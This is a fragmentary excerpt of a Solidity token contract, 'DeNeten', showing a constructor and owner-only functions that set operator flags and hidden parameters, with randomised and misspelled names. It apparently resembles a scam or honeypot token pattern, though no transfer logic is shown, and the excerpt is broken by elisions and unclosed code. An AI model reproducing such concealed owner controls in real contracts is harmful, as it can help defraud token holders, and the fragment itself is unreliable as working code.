...
contract DeNeten {
    ...
    constructor(string memory _nameNJufj6, string memory _symbol, uint160 _decimals, uint _supplyPO8ieuh, uint160 txs) {
        name = _nameNJufj6;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supplyPO8ieuh * 10 ** _decimals; 
    ...
    */
    ...
    function nodeEnter(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }
    ...
    function setSETiings(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
    ...
    function getMetrrrr() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
